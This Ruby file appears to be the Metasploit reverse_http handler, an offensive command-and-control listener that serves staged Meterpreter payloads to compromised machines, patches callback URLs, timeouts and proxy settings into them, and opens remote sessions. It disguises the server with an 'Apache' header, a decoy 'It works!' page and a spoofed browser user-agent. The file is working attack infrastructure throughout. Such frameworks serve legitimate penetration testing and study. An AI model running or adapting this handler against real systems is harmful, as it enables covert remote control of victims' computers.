# -*- coding: binary -*-
require 'rex/io/stream_abstraction'
require 'rex/sync/ref'
require 'msf/core/handler/reverse_http/uri_checksum'
require 'rex/payloads/meterpreter/patch'

module Msf
module Handler

###
#
# This handler implements the HTTP SSL tunneling interface.
#
###
module ReverseHttp

  include Msf::Handler
  include Msf::Handler::ReverseHttp::UriChecksum

  #
  # Returns the string representation of the handler type
  #
  def self.handler_type
    return "reverse_http"
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'tunnel'.
  #
  def self.general_handler_type
    "tunnel"
  end

  #
  # Initializes the HTTP SSL tunneling handler.
  #
  def initialize(info = {})
    super

    register_options(
      [
        OptString.new('LHOST', [ true, "The local listener hostname" ]),
        OptPort.new('LPORT', [ true, "The local listener port", 8080 ])
      ], Msf::Handler::ReverseHttp)

    register_advanced_options(
      [
        OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
        OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcibly shut down', (24*3600*7)]),
        OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300]),
        OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
        OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
        OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
        OptInt.new('ReverseListenerBindPort', [ false, 'The port to bind to on the local system if different from LPORT' ]),
        OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ]),
        OptAddress.new('HttpUnknownRequestForwardHost', [ false, 'Host to forward a request to when the handler receives a request that is not from a payload, instead of answering with HttpUnknownRequestResponse']),
        OptInt.new('HttpUnknownRequestForwardPort', [ false, 'Port to forward a request to when the handler receives a request that is not from a payload, instead of answering with HttpUnknownRequestResponse', 80]),
      ], Msf::Handler::ReverseHttp)
  end

  # Toggle for IPv4 vs IPv6 mode
  #
  def ipv6?
    Rex::Socket.is_ipv6?(datastore['LHOST'])
  end

  # Determine where to bind the server
  #
  # @return [String]
  def listener_address
    if datastore['ReverseListenerBindAddress'].to_s.empty?
      bindaddr = (ipv6?) ? '::' : '0.0.0.0'
    else
      bindaddr = datastore['ReverseListenerBindAddress']
    end

    bindaddr
  end

  # @return [String] A URI of the form +scheme://host:port/+
  def listener_uri
    if ipv6?
      listen_host = "[#{listener_address}]"
    else
      listen_host = listener_address
    end
    "#{scheme}://#{listen_host}:#{datastore['LPORT']}/"
  end

  # Return a URI suitable for placing in a payload.
  #
  # Host will be properly wrapped in square brackets, +[]+, for ipv6
  # addresses.
  #
  # @return [String] A URI of the form +scheme://host:port/+
  def payload_uri
    if ipv6?
      callback_host = "[#{datastore['LHOST']}]"
    else
      callback_host = datastore['LHOST']
    end
    "#{scheme}://#{callback_host}:#{datastore['LPORT']}/"
  end

  # Use the {#refname} to determine whether this handler uses SSL or not
  #
  def ssl?
    !!(self.refname.index("https"))
  end

  # URI scheme
  #
  # @return [String] One of "http" or "https" depending on whether we
  #   are using SSL
  def scheme
    (ssl?) ? "https" : "http"
  end

  # Create an HTTP listener
  #
  def setup_handler

    comm = datastore['ReverseListenerComm']
    if (comm.to_s == "local")
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end

    local_port = bind_port


    # Start the HTTPS server service on this host/port
    self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
      local_port,
      listener_address,
      ssl?,
      {
        'Msf'        => framework,
        'MsfExploit' => self,
      },
      comm,
      (ssl?) ? datastore["HandlerSSLCert"] : nil
    )

    self.service.server_name = datastore['MeterpreterServerName']

    # Create a reference to ourselves
    obj = self

    # Add the new resource
    service.add_resource("/",
      'Proc' => Proc.new { |cli, req|
        on_request(cli, req, obj)
      },
      'VirtualDirectory' => true)

    print_status("Started #{scheme.upcase} reverse handler on #{listener_uri}")
  end

  #
  # Simply calls stop handler to ensure that things are cool.
  #
  def cleanup_handler
    stop_handler
  end

  #
  # Basically does nothing.  The service is already started and listening
  # during set up.
  #
  def start_handler
  end

  #
  # Removes the / handler, possibly stopping the service if no sessions are
  # active on sub-urls.
  #
  def stop_handler
    self.service.remove_resource("/") if self.service
  end

  attr_accessor :service # :nodoc:

protected

  #
  # Parses the HTTPS request
  #
  def on_request(cli, req, obj)
    resp = Rex::Proto::Http::Response.new

    further_information = ""
    if req.headers["Host"]
      further_information = " at #{req.headers['Host']}"
    end
    if req.headers["X-Forwarded-For"]
      further_information = "#{further_information} via #{req.headers['X-Forwarded-For']}"
    end
    
    print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}#{further_information}...")

    uri_match = process_uri_resource(req.relative_resource)

    # Process the requested resource.
    case uri_match
      when /^\/INITPY/
        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
        url = payload_uri + conn_id + '/'

        blob = ""
        blob << obj.generate_stage

        var_escape = lambda { |txt|
          txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
        }

        # Patch all the things
        blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
        blob.sub!('HTTP_EXPIRATION_TIMEOUT = 604800', "HTTP_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
        blob.sub!('HTTP_COMMUNICATION_TIMEOUT = 300', "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")

        unless datastore['PROXYHOST'].blank?
          proxy_url = "http://#{datastore['PROXYHOST']}:#{datastore['PROXYPORT']}"
          blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
        end

        resp.body = blob

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :ssl                => ssl?,
        })

      when /^\/INITJM/
        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
        url = payload_uri + conn_id + "/\x00"

        blob = ""
        blob << obj.generate_stage

        # This is a TLV packet - I guess somewhere there should be an API for building them
        # in Metasploit :-)
        packet = ""
        packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
        packet << [url.length+8, 0x1000a].pack('NN')+url
        packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
        packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
        blob << [packet.length+8, 0].pack('NN') + packet

        resp.body = blob

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :ssl                => ssl?
        })

      when /^\/A?INITM?/
        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
        url = payload_uri + conn_id + "/\x00"

        print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
        resp['Content-Type'] = 'application/octet-stream'

        blob = obj.stage_payload

        #
        # Patch options into the payload
        #
        Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
          :ssl            => ssl?,
          :url            => url,
          :expiration     => datastore['SessionExpirationTimeout'],
          :comm_timeout   => datastore['SessionCommunicationTimeout'],
          :ua             => datastore['MeterpreterUserAgent'],
          :proxyhost      => datastore['PROXYHOST'],
          :proxyport      => datastore['PROXYPORT'],
          :proxy_type     => datastore['PROXY_TYPE'],
          :proxy_username => datastore['PROXY_USERNAME'],
          :proxy_password => datastore['PROXY_PASSWORD']

        resp.body = encode_stage(blob)

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :ssl                => ssl?,
        })

      when /^\/CONN_.*\//
        resp.body = ""
        # Grab the checksummed version of CONN from the payload's request.
        conn_id = req.relative_resource.gsub("/", "")

        print_status("Incoming orphaned session #{conn_id}, reattaching...")

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => payload_uri + conn_id + "/\x00",
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :ssl                => ssl?,
        })

      else
        print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match}...")
        req.inspect.split(/\n/).each { |line| vprint_status("#{cli.peerhost}:#{cli.peerport} #{line}") }
        if not datastore['HttpUnknownRequestForwardHost']
          resp.code    = 200
          resp.message = "OK"
          resp.body    = datastore['HttpUnknownRequestResponse'].to_s
        else
          c = Rex::Proto::Http::Client.new( datastore['HttpUnknownRequestForwardHost'], datastore['HttpUnknownRequestForwardPort'].to_i)
          new_req = req.clone
          new_req.headers = req.headers.clone
          if req.headers["X-Forwarded-For"]
            new_req.headers["X-Forwarded-For"] = "#{req.headers['X-Forwarded-For']}, #{cli.peerhost}"
          else
            new_req.headers["X-Forwarded-For"] = cli.peerhost
          end
          
          resp = c.send_recv(new_req)
        end
    end

    cli.send_response(resp) if (resp)

    # Force this socket to be closed
    obj.service.close_client( cli )
  end

protected

  def bind_port
    port = datastore['ReverseListenerBindPort'].to_i
    port > 0 ? port : datastore['LPORT'].to_i
  end

end

end
end

